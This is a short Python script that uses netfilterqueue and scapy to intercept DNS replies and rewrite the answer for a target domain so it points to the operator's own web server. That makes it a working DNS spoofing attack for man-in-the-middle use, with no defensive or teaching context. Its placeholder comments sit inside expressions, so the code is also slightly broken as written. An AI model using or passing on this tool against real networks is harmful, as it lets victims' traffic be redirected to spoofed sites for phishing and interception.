#!/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    """This program needs a static website."""
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname_field = scapy_packet[scapy.DNSQR].qname
        if #Input WEBSITE here: "www.stackoverflow.com" in qname_field:
            print("Spoofing target.")
            answer = scapy.DNSRR(rrname=qname_field, rdata=#INPUT STATIC IP OF YOUR WEB SERVER HERE: "10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
